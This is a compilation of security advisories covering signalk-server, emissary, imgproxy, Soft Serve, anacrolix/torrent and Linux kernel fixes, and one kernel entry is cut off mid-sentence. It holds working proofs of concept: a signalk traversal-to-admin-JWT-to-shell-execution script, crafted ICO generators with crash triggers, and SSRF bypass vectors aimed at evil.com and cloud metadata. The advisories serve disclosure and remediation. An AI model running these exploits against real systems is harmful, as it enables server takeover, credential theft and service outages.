### Summary

The app store icon code (`dist/appstore/icon-probe.js` around line 200 and `icon-bytes.js` around line 138) resolves a plugin's declared `signalk.appIcon`. Relative paths are pinned to the CDN, but an absolute http(s) URL is used as-is: the server fetches it, follows redirects, and stores any `image/*` response as the plugin's icon, which is then served to the admin UI. Unrelated to GHSA-q59x-jc9f-gfqf.

### Affected

signalk-server 2.33.0 (latest).

### Reproduction

The real dist modules driven directly, Docker with `--network none`; a local "internal" service on 127.0.0.1 logs requests:

```
[CONTROL relative] declared=../../icon.png
  resolved=null
  internal-service hits: []  stored: null
[ATTACK absolute] declared=http://127.0.0.1:35013/latest/meta-data/iam
  resolved=http://127.0.0.1:35013/latest/meta-data/iam
  internal-service hits: ["GET /latest/meta-data/iam"]  stored: .../icon-bytes/evil-plugin@1.0.0.png (70 bytes)
[ATTACK redirect] declared=http://127.0.0.1:35013/redir
  internal-service hits: ["GET /redir","GET /internal-secret-via-redirect.png"]  stored: .../icon-bytes/evil-plugin@1.0.0.png (70 bytes)
```

The modules were tested directly rather than through a full running server.

### Impact

Anyone who can get a plugin listed in the app store (publishing an npm package with the signalk keywords) can make every signalk-server that browses the app store send requests to internal addresses on the vessel network and to cloud metadata endpoints. Responses with an image content type are stored and served back to the user.

### Suggested fix

Only accept relative icon paths resolved against the CDN (or an https allowlist of known hosts), do not follow redirects to other hosts, and reject private, loopback and link-local addresses after resolution.

In the Linux kernel, the following vulnerability has been resolved:

net/mlx5e: TC, Check if flow is PEER before acquiring devcom lock

In case __mlx5e_add_fdb_flow() fails in lower levels, the flow is
deleted via mlx5e_tc_del_flow(), and mlx5e_tc_del_flow() is acquiring
ESW devcom lock without condition. In addition, in case of peer_flow,
__mlx5e_add_fdb_flow() is called while holding ESW devcom comp lock.
This results in an AA deadlock.

To fix this, introduce a new PEER flag that is set on flows created as

items.summary:
In the Linux kernel, the following vulnerability has been resolved:

net/sched: act_api: fix TOCTOU NULL deref on a->goto_chain

tcf_action_exec() handles TC_ACT_GOTO_CHAIN by first checking
rcu_access_pointer(a->goto_chain) and then calling
tcf_action_goto_chain_exec(), which does a second, independent
rcu_dereference_bh(a->goto_chain) read and immediately dereferences
chain->filter_chain. A concurrent tcf_action_set_ctrlact() (e.g. the gact
replace path) can clear a->goto_chain between the two reads, so the second
read returns NULL and tcf_action_goto_chain_exec() dereferences NULL.

Fix the race by doing a single rcu_dereference_bh() read of a->goto_chain
in tcf_action_exec(), checking it once for NULL, and passing the resulting
chain pointer into tcf_action_goto_chain_exec(). This turns the split
check/use into a single check/use on one value.

items.summary: mouse07410/asn1c is an ASN.1 compiler. Prior to 1.2.5, `OPEN TYPE` decoding can dereference an unallocated member pointer and crash the consuming program. `OPEN_TYPE_aper_get` in `OPEN_TYPE_aper.c`, `OPEN_TYPE_ber_get` in `OPEN_TYPE_ber.c`, `OPEN_TYPE_oer_get` in `OPEN_TYPE_oer.c`, and `OPEN_TYPE_uper_get` in `OPEN_TYPE_uper.c` share the pattern: a conditional null check on `*memb_ptr2` resets presence only when the member exists, but execution then unconditionally computes an inner value from that pointer and a member offset. If the `OPEN TYPE` member has not been allocated, the null-pointer arithmetic and subsequent read cause a segmentation fault. The advisory demonstrates UPER and APER crashes for `E2connectionUpdateAcknowledge`, notes that `E2AP` uses APER, and provides a BER reproducer; OER is also explicitly identified as affected. This issue is fixed in version 1.2.5.

items.summary:
### Summary

The URL validation regex `^(https?:/)?/.*` added to emissary's `NavAction.java` allows protocol-relative URLs (`//evil.com/...`) and single-slash scheme variants (`http:/evil.com`) to bypass validation, enabling SSRF and open redirect attacks.

### Affected Package

- **Ecosystem:** Maven
- **Package:** NationalSecurityAgency/emissary
- **Affected versions:** < e2078417464b
- **Patched versions:** >= e2078417464b

### Severity

Medium

### CWE

CWE-918 — Server-Side Request Forgery (SSRF)

### Details

The fix in `NavAction.java` (line 47) introduces a `VALID_LINK` pattern:

```java
Pattern.compile("^(https?:/)?/.*")
```

This regex is intended to restrict navigation links to relative paths and HTTP/HTTPS URLs. However, it has multiple bypass vectors.

Protocol-relative URLs (`//evil.com/...`): The group `(https?:/)?` is optional, so the pattern reduces to `//.*` when the group is absent. This matches `//evil.com/steal?c=SESSION`, which browsers resolve to the current page's protocol plus the attacker's host.

Single-slash scheme (`http:/evil.com`): The regex group captures `http:/` as a valid match, and browsers normalize `http:/evil.com` to `http://evil.com`, creating an open redirect to the attacker's server.

Protocol-relative to cloud metadata (`//169.254.169.254/...`): This enables SSRF to cloud instance metadata endpoints, which is particularly dangerous in AWS/GCP environments where IAM credentials can be retrieved.

The pre-fix code had no validation at all, accepting any URL. The fix blocks `javascript:`, `ftp:`, and `data:` URIs, but the protocol-relative and single-slash bypasses remain exploitable.

### PoC

```python
"""
CVE-2026-35571 - NationalSecurityAgency/emissary SSRF via NavAction

The fix in commit e2078417464b adds URL scheme validation using:
    Pattern.compile("^(https?:/)?/.*")

This allows protocol-relative URLs (//evil.com) and single-slash variants
(http:/evil.com) to bypass the validation.

Tested against: emissary@0d4dc56 (pre-fix) and patch e207841
Extracted from: src/main/java/emissary/server/mvc/NavAction.java:47
"""

import re
import sys

FIXED_PATTERN = re.compile(r"^(https?:/)?/.*")


def vulnerable_accepts(link: str) -> bool:
    """Pre-fix behaviour: no validation, everything passes."""
    return True


def fixed_accepts(link: str) -> bool:
    """Post-fix behaviour: must match VALID_LINK pattern."""
    return bool(FIXED_PATTERN.match(link))


TEST_VECTORS = [
    ("javascript: XSS payload",
     "javascript:alert(document.cookie)", True),
    ("ftp: scheme",
     "ftp://evil.com/exfil", True),
    ("data: URI",
     "data:text/html,<script>alert(1)</script>", True),

    ("Relative path",
     "/path/to/resource", False),
    ("HTTP URL",
     "http://trusted.internal:8080/api", False),
    ("HTTPS URL",
     "https://trusted.internal/api", False),

    ("Protocol-relative URL to attacker host (//evil.com)",
     "//evil.com/steal?c=SESSION", True),
    ("Protocol-relative with embedded credentials",
     "//user:pass@evil.com/path", True),
    ("Protocol-relative to cloud metadata (//169.254.169.254)",
     "//169.254.169.254/latest/meta-data/", True),
    ("Backslash trick (\\\\evil.com)",
     "\\\\evil.com/path", True),
    ("Tab in scheme (java\\tscript:...)",
     "java\tscript:alert(1)", True),
    ("Path starting with attacker-like host (/evil.com)",
     "/evil.com", False),
    ("Triple slash (///evil.com)",
     "///evil.com/etc/passwd", True),
    ("http:/ single-slash to attacker host",
     "http:/evil.com/steal", True),
    ("https:/ single-slash to attacker host",
     "https:/evil.com/steal", True),
    ("URL-encoded javascript scheme (%6a...)",
     "%6aavascript:alert(1)", True),
    ("CRLF injection in path",
     "/legit\r\nLocation: http://evil.com", True),
]


def main():
    print("=" * 72)
    print("CVE-2026-35571 -- Emissary NavAction SSRF / Open-Redirect PoC")
    print("Pattern under test: ^(https?:/)?/.*")
    print("=" * 72)
    print()

    bypasses_found = []
    results_table = []

    for desc, url, should_block in TEST_VECTORS:
        vuln_result = vulnerable_accepts(url)
        fixed_result = fixed_accepts(url)

        if should_block and fixed_result:
            status = "BYPASS"
            bypasses_found.append((desc, url))
        elif should_block and not fixed_result:
            status = "BLOCKED (good)"
        elif not should_block and fixed_result:
            status = "ALLOWED (good)"
        elif not should_block and not fixed_result:
            status = "FALSE-POS"
        else:
            status = "UNKNOWN"

        results_table.append((desc, url, vuln_result, fixed_result, status))

    for desc, url, vuln, fixed, status in results_table:
        display_url = repr(url) if len(url) > 50 else url
        print(f"[{status:>15}]  {desc}")
        print(f"{'':>17}  URL: {display_url}")
        print(f"{'':>17}  pre-fix={vuln}  post-fix={fixed}")
        print()

    print("=" * 72)
    print(f"Total vectors tested : {len(TEST_VECTORS)}")
    print(f"Bypasses found       : {len(bypasses_found)}")
    print()

    if bypasses_found:
        print("VULNERABILITY CONFIRMED -- the following vectors bypass the fix:")
        print()
        for desc, url in bypasses_found:
            print(f"  - {desc}")
            print(f"    URL: {repr(url)}")
        print()
        print("Key finding: The regex ^(https?:/)?/.* allows protocol-relative")
        print("URLs (//evil.com/...) because the optional group (https?:/) can be")
        print("absent, leaving //.* which matches //attacker.com. This enables")
        print("SSRF to arbitrary external hosts via navigation links.")
        print()
        print("Additionally, http:/evil.com and https:/evil.com match the regex")
        print("(group 1 captures 'http:/' or 'https:/') and browsers normalise")
        print("these to http://evil.com, enabling open redirect / SSRF.")
        sys.exit(0)
    else:
        print("No bypasses found -- fix appears complete.")
        sys.exit(1)


if __name__ == "__main__":
    main()

```

**Steps to reproduce:**
1. Run `python3 poc.py`
2. Observe that protocol-relative and single-slash URLs bypass the regex

**Expected output:**
```
VULNERABILITY CONFIRMED
Protocol-relative URLs (//evil.com/) and single-slash variants (http:/evil.com) bypass the regex validation.
```

### Impact

An attacker can craft navigation links that bypass URL validation to redirect users to attacker-controlled servers (open redirect) or make the emissary server issue requests to internal services (SSRF). The `//169.254.169.254/latest/meta-data/` bypass is particularly dangerous in cloud environments, enabling retrieval of IAM credentials.

### Suggested Remediation

Replace the regex with one that explicitly rejects protocol-relative URLs. Alternatively, parse the URL with `java.net.URI` and validate the scheme and host against an allowlist rather than relying on regex.

### References

- Incomplete fix commit: https://github.com/NationalSecurityAgency/emissary/commit/e2078417464b9004620dde28dcbca2f73ea06c13
- Original CVE: CVE-2026-35571

In the Linux kernel, the following vulnerability has been resolved:

phy: qcom-qusb2: Fix NULL pointer dereference on early suspend

Enabling runtime PM before attaching the QPHY instance as driver data
can lead to a NULL pointer dereference in runtime PM callbacks that
expect valid driver data. There is a small window where the suspend
callback may run after PM runtime enabling and before runtime forbid.
This causes a sporadic crash during boot:

```
Unable to handle kernel NULL pointer dereference at virtual address 00000000000000a1
[...]
CPU: 0 UID: 0 PID: 11 Comm: kworker/0:1 Not tainted 6.16.7+ #116 PREEMPT
Workqueue: pm pm_runtime_work
pstate: 20000005 (nzCv daif -PAN -UAO -TCO -DIT -SSBS BTYPE=--)
pc : qusb2_phy_runtime_suspend+0x14/0x1e0 [phy_qcom_qusb2]
lr : pm_generic_runtime_suspend+0x2c/0x44
[...]
```

Attach the QPHY instance as driver data before enabling runtime PM to
prevent NULL pointer dereference in runtime PM callbacks.

Reorder pm_runtime_enable() and pm_runtime_forbid() to prevent a
short window where an unnecessary runtime suspend can occur.

Use the devres-managed version to ensure PM runtime is symmetrically
disabled during driver removal for proper cleanup.

### Summary

Unbounded and unvalidated memory allocation in imgproxy's ICO loader (`vips/icoload.c`). An attacker-controlled `data_size` field (u32) from the ICO directory entry is passed directly to `VIPS_MALLOC` without any bounds check, so a single crafted 23-byte ICO file makes an imgproxy worker attempt a ~4GB allocation. Present in the latest release (v4.0.15) and the 3.3.x series; confirmed on a live production deployment of imgproxy v4.0.15.

### Details

In `vips_foreign_load_ico_header` in `vips/icoload.c`, the selected directory entry's `data_size` is read and used directly for the allocation:

```
uint32_t data_size = GUINT32_FROM_LE(largest_image_header.data_size);

// BMP file explicitly excludes BITMAPFILEHEADER, so we need to add it manually.
VipsPel *data = (VipsPel *) VIPS_MALLOC(NULL, data_size + BMP_FILE_HEADER_LEN);
```

There is no validation that `data_size` is sane nor any check that the file actually contains `data_size` bytes at the declared `data_offset`. A crafted 23-byte ICO whose directory entry declares `data_size = 0xfa000068` (~4GB) drives `VIPS_MALLOC(NULL, ~4GB + 14)`.

### PoC

```py
# make_ico_4gb.py — generates the exact 23-byte unbounded-allocation trigger.
# Byte-identical to the checksummed, production-verified file:
#   ico-4gb.ico  sha256 6cee1fbfdc69fd4f507e86835ce2fa54519e55608f1dd69f42860f9961b1045b
import struct, hashlib

hdr = struct.pack('<HHH', 0, 1, 1)  # reserved, type=ICO, count=1
entry = struct.pack('<BBBBHHII', 16, 16, 0, 0, 1, 32, 0xfa000068, 0x16)
data = b'\x00'
blob = hdr + entry + data
assert hashlib.sha256(blob).hexdigest() == \
    '6cee1fbfdc69fd4f507e86835ce2fa54519e55608f1dd69f42860f9961b1045b'
open('ico-4gb.ico', 'wb').write(blob)
print(f"ico-4gb.ico: {len(blob)} bytes [VERIFIED]")
```

```
# imgproxy v4.0.15 with local file sources enabled:
#   IMGPROXY_ENABLE_LOCAL_FILES=true IMGPROXY_LOCAL_FILESYSTEM_ROOT=/ imgproxy
curl "http://127.0.0.1:8080/insecure/plain/local:///path/to/ico-4gb.ico@png"
# → outcome depends on host memory: on a memory-constrained pod the worker
#   OOM-dies; on a larger host the ~4GB allocation succeeds transiently and
#   decode fails -> HTTP 500 (worker survives, but each request burns ~4GB
#   transiently — repeatable memory exhaustion).
```

### Impact

Unauthenticated network DoS / memory-exhaustion: on memory-constrained workers, a crash per crafted request. On larger hosts, ~4GB transient allocation per request (sustained firing exhausts memory or the allocation budget). Any imgproxy deployment that processes attacker-supplied images.

## Summary

The ICO loader allocates `data_size + BMP_FILE_HEADER_LEN` bytes after reading a 32-bit attacker-controlled `data_size`. For `data_size > UINT32_MAX - BMP_FILE_HEADER_LEN`, the addition wraps before allocation. imgproxy then writes the ICO prefix and reads up to the original declared size starting 14 bytes into the undersized allocation. A network client can turn this heap overflow into remote denial of service or remote code execution.

## Technical details

The vulnerable path is in [`vips/icoload.c` at commit `f4fedbb`](https://github.com/imgproxy/imgproxy/blob/f4fedbb5c7f6684e7a8e0a9bb7e666773f3c40c0/vips/icoload.c#L154-L164):

```c
uint32_t data_size = GUINT32_FROM_LE(largest_image_header.data_size);

VipsPel *data = (VipsPel *) VIPS_MALLOC(NULL, data_size + BMP_FILE_HEADER_LEN);
void *actual_data = data + BMP_FILE_HEADER_LEN;

if (vips_foreign_load_read_full(ico->source, actual_data, data_size) <= 0) {
  vips_error("vips_foreign_load_ico_header", "unable to read ICO image data from the source");
  return -1;
}
```

The crafted directory entry contains:

```text
data_size       = 0xfffffff5 (4294967285)
data_offset     = 22
BMP header size = 14
32-bit result   = (0xfffffff5 + 14) mod 2^32 = 3
```

The allocation is therefore three bytes. `actual_data` points 14 bytes after the allocation base. The fixture contains 64 bytes after the ICO header, so the source callback copies those 64 bytes to an invalid destination before it can report that the declared multi-gigabyte payload is incomplete.

The complete source-to-sink path is:

1. Attacker-controlled bytes begin with the ICO magic `00 00 01 00`.
2. imgproxy identifies the source as ICO and dispatches it to `vips_icoload_source_go`.
3. `vips_foreign_load_ico_header` reads the attacker-controlled `data_size`.
4. The 32-bit addition wraps, and `VIPS_MALLOC` receives the value three.
5. `vips_foreign_load_read_full` passes the original `data_size` to the Go source callback.
6. The callback writes the available source bytes through the invalid pointer, corrupting the process heap.

## Impact

A crafted image can terminate the imgproxy process handling it or potentially lead to remote code execution due to heap corruption.

## Summary

Soft Serve answers Go's `?go-get=1` requests by walking up the requested path until it finds a repository, then rendering that repository's name and clone URL into a `go-import` meta tag. The walk checked that each candidate repository existed, but never that the caller could read it.

A request for a path inside a private repository, such as `GET /secret/anything?go-get=1`, therefore returned `200` naming `secret` and its clone URL, even though `GET /secret?go-get=1` correctly returned `404`. The same `?go-get=1` exception in the HTTP access middleware also let requests reach the LFS and dumb-HTTP routes with the repository existence check skipped, where two LFS handlers dereferenced the missing repository and panicked.

The same disclosure appears without `?go-get=1`. The Git and LFS routes answered a repository the caller could not read differently depending on whether it existed: an anonymous clone of a private repository got `401` while a missing one got `404`, and a signed-in user without access got the reverse pattern. Either way, one request confirms whether a guessed name is a private repository. This was found while fixing the go-get issue and is included here because it has the same impact and is fixed in the same release.

## Impact

A remote client can learn, with one request per candidate name, which private repositories exist, their exact names, and their clone URLs. Under the shipped default of `anon-access: read-only` no account is needed, and an authenticated user without access to the repository gets the same answer. Project names in private deployments are often sensitive (internal codenames, unreleased products, customer names), and this turns them into an enumerable namespace.

The Git and LFS routes give the same confirmation for any guessed name, to anonymous and authenticated callers alike, and an invalid `Authorization: Bearer` header does the same even where credentials are otherwise required.

Repository contents, refs, commits, and collaborators are not exposed, and no write path is reachable. The LFS panic is caught by the recovery middleware and returns a `500`; the server stays up. Hidden repositories are not affected beyond what direct access already allows, since hiding a repository removes it from listings but does not restrict reading it by name.

Reachable over the HTTP interface, which is enabled by default (AV:N), with one ordinary GET request per name (AC:L). No privileges are required under the default anonymous read access (PR:N), and no victim interaction is needed (UI:N). Only repository names and clone URLs are disclosed, which is a low confidentiality impact (C:L), with no integrity or availability impact (I:N, A:N), since the panic is recovered per request.

## Root Cause

Two pieces of code each assumed the other had checked access.

`withAccess` in `pkg/web/git.go` computed the access level for the requested path and then let go-get requests through ahead of the guard meant to hide repositories:

```go
case r.URL.Query().Get("go-get") == "1" && accessLevel >= access.ReadOnlyAccess:
	// Allow go-get requests to passthrough.
	break
case repo == nil, accessLevel < access.ReadOnlyAccess:
	// Don't hint that the repo exists if the user doesn't have access
	renderNotFound(w, r)
	return
```

For a path that is not itself a repository, `AccessLevelForUser` returns the anonymous access level to anonymous callers and read-write to any authenticated user, since that is what allows a push to create a new repository. The go-get case therefore always matched for a sub-path, and the "don't hint that the repo exists" guard below it never ran.

`GoGetHandler` in `pkg/web/goget.go` then trimmed path segments with `path.Dir` until `be.Repository` succeeded, and rendered the first repository it found. It never asked whether the caller could read that repository. The access level the middleware had computed was for a different path.

Because the exception lived in the middleware shared by every Git route rather than on the go-get route, it also applied to the dumb-HTTP and LFS routes. There it skipped the `repo == nil` guard, and `serviceLfsBasicDownload` and `serviceLfsBasicUpload` dereferenced a nil repository from the request context. The sibling LFS handlers already checked for nil, which is why only those two panicked.

The Git and LFS routes behind `withAccess` had the opposite problem: each branch chose its own response for a caller who could not read the repository, and the choice depended on which condition failed first. On the smart HTTP routes a missing repository was checked before credentials, so it returned `404`, while a private one fell through to the credential prompt and returned `401`. On the LFS write routes the write-access check ran before the read check, so a signed-in user got `403` for a private repository and `404` for a missing one. And `parseJWT` in `pkg/web/auth.go` rejected a token for a missing repository with a "missing repository" error, which the caller treated as anonymous, while a token for an existing repository failed as invalid and got `403`.

## Affected Versions

v0.5.0 through v0.12.2. The go-get walk-up without an access check was introduced in commit `3dfecd9` (`fix(http): go-get requests`), and private repositories arrived in the same v0.5.0 release. The middleware exception that also reached the LFS and dumb-HTTP routes was added in v0.6.0, together with the HTTP LFS routes, and the differing responses on the Git and LFS routes date from the same middleware.

## Patches

Fixed in `v0.12.3`.

The go-get route no longer goes through the per-repository access middleware. It authenticates the caller and nothing more, and `GoGetHandler` checks read access on each repository it considers during the walk-up. A repository the caller cannot read is skipped exactly as if it did not exist, so an unreadable repository and a missing one produce the same `404`, and a readable repository nested under an unreadable one still resolves.

The go-get exception is removed from `withAccess` entirely. Every Git, dumb-HTTP, and LFS route now enforces the repository existence and access checks regardless of the query string. The two LFS basic handlers also check for a missing repository, as their siblings did, so a future routing mistake returns a `404` rather than a panic.

`AccessLevelForUser` used to prefer the repository attached to the request over the name it was asked about. During the walk-up those differ, so the access check now always looks the repository up by the name it is given.

Bad credentials on a go-get request now return `403`, the same as on the Git routes. Previously they were treated as anonymous for paths that were not themselves repositories.

On the Git and LFS routes, any repository the caller cannot read now gets one answer, decided in one place: `403` when the credentials are wrong, `401` with a credential prompt when the caller is anonymous, and `404` when they are signed in. This matches how GitHub responds. The LFS write checks now run after the read check, and a JWT presented for a missing repository is rejected as an invalid token like any other.

Two behaviours change as a result. An anonymous clone of a mistyped repository name now prompts for credentials instead of reporting that the repository does not exist, and a signed-in user without access to a private repository now gets "not found" instead of a credential prompt.

Pushing over HTTP to a name that does not exist still creates the repository, so a user allowed to create repositories can still tell a taken name from a free one by trying to push. That is inherent to push-to-create and is not changed here.

## Workarounds

None. Upgrade to the patched release.

Disabling the HTTP server (`http.enabled: false`) removes the exposure, at the cost of HTTP Git access. Setting `anon-access` to `no-access` limits the disclosure to authenticated users.

### Summary

Path traversal in the Signal K resources and applicationData APIs lets an
unauthenticated or low-privileged user read, write and delete files outside
the storage root. Reading <config>/security.json discloses the JWT signing
secret, enabling admin token forgery and remote code execution. 

### Details

## Description

The v2 REST resources API `GET /signalk/v2/api/resources/:resourceType/:resourceId` passes `resourceId` to `FileStore.getResource()` without validation. `getResource()` builds the file path with `path.join(this.resources[type].path, itemUuid)` followed by `readFile` + `JSON.parse`, so a `%2F`-encoded multi-level traversal (`..%2F..%2F..%2F..%2F`) escapes the resource storage directory and returns any JSON file on the server (source: `src/api/resources/index.ts:559-600`, `packages/resources-provider-plugin/src/filestorage.ts:115-125`).

Because the JWT signing secret is stored in plaintext in `<config>/security.json` (generated at `src/tokensecurity.ts:271`, persisted via `saveSecurityConfig` at `src/security.ts:377`), an unauthenticated attacker on deployments with `allow_readonly=true` (a supported, UI-toggleable configuration granting anonymous read access) can:

1. **Read `<config>/security.json`** — disclosing the JWT signing secret (512-hex) and user password hashes.
2. **Forge an admin JWT** — HS256-sign `{"id":"admin"}` with the disclosed secret; accepted by `/skServer/loginStatus` (`userLevel: "admin"`) and all admin-protected endpoints (`adminAuthenticationMiddleware`, `src/tokensecurity.ts:593`, applied at `src/tokensecurity.ts:953`).
3. **Gain remote code execution** — `POST /skServer/providers` (admin) accepts a provider of type `Execute`; `packages/streams/src/execute.ts:93` executes it via `spawn('sh', ['-c', command])` at creation time. The provider persists to `settings.json` and survives restarts.

On default deployments (`allow_readonly=false`), step 1 returns 401 to anonymous users but succeeds with any readonly user token.

## Suggested fixes

1. Validate `resourceId` against a strict whitelist (for example, UUID format) in `src/api/resources/index.ts` before any storage call, including PUT/DELETE.
2. In `FileStore.getResource/setResource/deleteResource`, canonicalise with `path.resolve()` and reject results outside `this.resources[type].path`.
3. Store the JWT signing secret outside the API-readable config directory, in a dedicated key file with mode 0600.
4. Consider gating provider types that execute commands (`Execute`) behind an explicit opt-in.

### Proof of concept

Fully local testbed. Start the server, enable `allow_readonly=true`, then run:

```python
#!/usr/bin/env python3
import base64, hashlib, hmac, json, time, urllib.request
BASE = "http://127.0.0.1:3000"
CMD  = "id > /tmp/sk-pwned"

# 1) unauthenticated traversal read of security.json
p = "/signalk/v2/api/resources/notes/..%2F..%2F..%2F..%2Fsecurity.json"
sk = json.load(urllib.request.urlopen(BASE + p))["secretKey"]

# 2) forge admin JWT
b64 = lambda b: base64.urlsafe_b64encode(b).rstrip(b"=").decode()
h = b64(json.dumps({"alg":"HS256","typ":"JWT"}).encode())
c = b64(json.dumps({"id":"admin","iat":int(time.time())}).encode())
tok = h+"."+c+"."+b64(hmac.new(sk.encode(), (h+"."+c).encode(), hashlib.sha256).digest())
req = urllib.request.Request(BASE+"/skServer/loginStatus", headers={"Authorization":"JWT "+tok})
assert json.load(urllib.request.urlopen(req))["userLevel"] == "admin"

# 3) add an Execute provider -> spawn('sh','-c',CMD)
prov = {"id":"poc-rce","enabled":True,"logging":False,"type":"Execute",
        "options":{"type":"ws","dataType":"SignalK","command":CMD}}
req = urllib.request.Request(BASE+"/skServer/providers", data=json.dumps(prov).encode(),
                             headers={"Authorization":"JWT "+tok,"Content-Type":"application/json"}, method="POST")
print(urllib.request.urlopen(req).read())    # provider created; /tmp/sk-pwned now exists
```

Reproduction verified independently on master `340d5bb6` (Node 22 / macOS), including restart persistence. PoC artifacts are available on request.

### Impact

Unauthenticated access (with `allow_readonly=true`) leads to full compromise of the server process: arbitrary JSON file read, admin takeover, arbitrary command execution with server privileges, and persistent re-execution after restart. All signalk-server releases and all published versions of the bundled/standalone resources-provider prior to 2.34.0 are affected with the patched version as 2.34.0 fix

### Summary

Out-of-bounds heap write in imgproxy's ICO loader (`vips/icoload.c`): when the ICO entry's image data buffer is small, the loader's BMP-header-reconstruction writes land past the allocation, corrupting the size field of the following heap chunk. The worker then aborts deterministically (glibc `munmap_chunk(): invalid pointer` → SIGABRT → Go panic, exit code 2). 

### Details

In `vips_foreign_load_ico_header` in `vips/icoload.c`, after the ICO entry's image data is read into a heap buffer of `data_size + 14` bytes, the loader reconstructs a BMP file header in front of it using fields read from the ICO's internal BITMAPINFOHEADER:

```
uint32_t num_colors = GUINT32_FROM_LE(*(uint32_t *) (actual_data + 32));  // unvalidated
uint16_t bpp        = GUINT16_FROM_LE(*(uint16_t *) (actual_data + 14));  // unvalidated
```

```
if ((num_colors == 0) && (bpp <= 8))
  pix_offset = BMP_FILE_HEADER_LEN + BMP_BITMAP_INFO_HEADER_LEN + 4 * (1 << bpp);
else
  pix_offset = BMP_FILE_HEADER_LEN + BMP_BITMAP_INFO_HEADER_LEN + 4 * num_colors;
```

```
int32_t height = GINT32_FROM_LE(*(int32_t *) (actual_data + 8));  // readable past the buffer
height = height / 2;
```

With a crafted entry declaring a tiny `data_size` (e.g. 1 byte), all of these reads (offsets +8, +14, +32) go past the allocation, and the reconstructed-header writes land past the end of the buffer — specifically a 32-bit `height/2`-derived value at `alloc+22..+25`, overwriting the LSBs of the size field of the physically following heap chunk. The corrupted size is always `original_size >> 1` and, in cgo thread arenas, the `NON_MAIN_ARENA` bit lands in the `IS_MMAPPED` position of the corrupted word such that the next `free()` of the victim deterministically takes glibc's `munmap_chunk()` abort path, killing the worker. Depending on heap state, the worker returns 500 for the triggering request and aborts on the corrupted chunk's free; in observed production geometry it dies on the same request (exit code 2).


### PoC

```py
# make_ico_oob.py — generates the exact 23-byte OOB-write trigger.
# Byte-identical to the checksummed, production-verified file:
#   ico-oob.ico  sha256 075f3b5e97242573d32a1b7612672a438b3b24c8fa718e3967305bd65e6151e1
import struct, hashlib

hdr = struct.pack('<HHH', 0, 1, 1)  # reserved, type=ICO, count=1
# 16x16, 0 colors, 0 reserved, 1 plane, 32 bpp, data_size=1, data_offset=0x16.
# The tiny data_size (1) makes the loader's BMPINFOHEADER field reads
# (data+8/+14/+32) and header-reconstruction writes go past the 1+14=15-byte
# allocation.
entry = struct.pack('<BBBBHHII', 16, 16, 0, 0, 1, 32, 1, 0x16)
data = b'\xAA'  # the single declared image byte
blob = hdr + entry + data
assert hashlib.sha256(blob).hexdigest() == \
    '075f3b5e97242573d32a1b7612672a438b3b24c8fa718e3967305bd65e6151e1'
open('ico-oob.ico', 'wb').write(blob)
print(f"ico-oob.ico: {len(blob)} bytes [VERIFIED]")
```

```
# imgproxy v4.0.15 with local file sources enabled:
#   IMGPROXY_ENABLE_LOCAL_FILES=true IMGPROXY_LOCAL_FILESYSTEM_ROOT=/ imgproxy
curl "http://127.0.0.1:8080/insecure/plain/local:///path/to/ico-oob.ico@png"
# → request fails at transport level (connection reset / empty reply) or
#   HTTP 500; worker dies: munmap_chunk(): invalid pointer → SIGABRT →
#   Go panic dump → exit code 2. One request, one dead worker.

curl "http://127.0.0.1:8080/insecure/plain/local:///path/to/normal.ico@png"
# → HTTP 200, valid thumbnail (control)
```

### Impact

Out-of-bounds write; demonstrated impact is denial of service (worker crash per crafted request). Any imgproxy deployment from the 3.3.x ICO-support series through v4.0.15 (latest at time of report) that processes attacker-supplied images.

## Summary

anacrolix/torrent's bencode decoder (`bencode/`) applies **no limit on the nesting depth** of nested dictionaries and lists. Two distinct denial-of-service mechanisms follow from that single root cause, both reachable from a single crafted `.torrent` file or from metadata obtained from a peer on a magnet-link/v2 download:

1. **Stack-overflow process crash.** `Decoder.readOneValue` recurses once per nesting level with no depth bound. A `.torrent` whose `info` value is a list nested a few million levels deep (≈8 MB file) drives the recursion past the 1 GiB goroutine-stack limit and the process dies with an unrecoverable `fatal error: stack overflow`. 2. **Quadratic CPU exhaustion.** `metainfo.FileTree.UnmarshalBencode` (BitTorrent v2) re-parses each subtree at every level, making parse time grow ~O(n²). A v2 info dict with a ~30,000-level file tree (≈0.2 MB) takes ~66 s to decode; 60,000 levels exceeds 90 s of decode time.

Affected: every application embedding `github.com/anacrolix/torrent` that ingests attacker-supplied metainfo - the CLI tools (`cmd/torrent`, `cmd/torrent2`), any server that opens `.torrent` files, or any client that accepts metadata from a peer for a magnet/v2 download. No depth limit has ever existed in the decoder.

## Vulnerability Details

All file:line references are against the pinned commit `4ad31c5170787215c51c6ddaa54abc06b623c11c`.

### Root cause - no recursion/depth limit in the bencode decoder

`bencode/decode.go` implements three independently unbounded recursive parsers. There is no depth counter and no `MaxDepth`/nesting guard anywhere in `bencode/` or `metainfo/`.

**Defect 1 - `readOneValue` recursion (`bencode/decode.go:546-549`)**

```go
case 'd', 'l':
    // read until there is nothing to read
    for d.readOneValue() {
    }                       // <- recurses once per nested dict/list level, unbounded
```

`readOneValue` is invoked by `Decoder.parseUnmarshaler` (`bencode/decode.go:591`) whenever a decoded field implements `bencode.Unmarshaler`, which includes `bencode.Bytes` - the type of `MetaInfo.InfoBytes` (`metainfo/metainfo.go:17`). So decoding a normal `.torrent` routes the entire `info` value through this recursion. Stack usage is ~256 bytes per level (consistent with the observed ~4M-level crash at the 1 GiB goroutine-stack limit), so nesting `l` a few million levels deep exhausts the 1 GiB default goroutine-stack limit. Go's stack overflow is a `fatal error` - it is not a recoverable panic, so the `recover()` in `Decoder.Decode` (`bencode/decode.go:35-55`) cannot intercept it, and the whole process terminates.

Entry points that reach `readOneValue` with attacker-controlled bytes:
- `metainfo.Load` (`metainfo/metainfo.go:35`) / `metainfo.LoadFromFile` (`metainfo.go:50`) - decoding a `.torrent` file; the `info` value becomes a `bencode.Bytes` unmarshaler field.
- `Client.AddTorrent` / `Client.AddTorrentFromFile` -> `metainfo.LoadFromFile` (`client.go:1776` inside `AddTorrentFromFile`), and `TorrentSpec.InfoBytes` -> `setInfoBytesLocked` -> `bencode.Unmarshal(b, &info)` (`torrent.go:638`) - peer-fetched metadata.

For the **remote-peer path** (magnet-link/v2 download), peer-supplied metadata pieces are reassembled and passed to `setInfoBytesLocked` once complete (`torrent.go:1874`). The accepted metadata size is capped at `maxMetadataSize = 16 MiB` (`global.go:18`), which comfortably admits the ≈8 MB Defect-1 payload and the ≈0.2 MB Defect-2 payload, so both defects are reachable from an untrusted peer, not only from a locally-opened `.torrent`.

**Defect 2 - `FileTree.UnmarshalBencode` recursive re-parse (`metainfo/file-tree.go:42-49`)**

```go
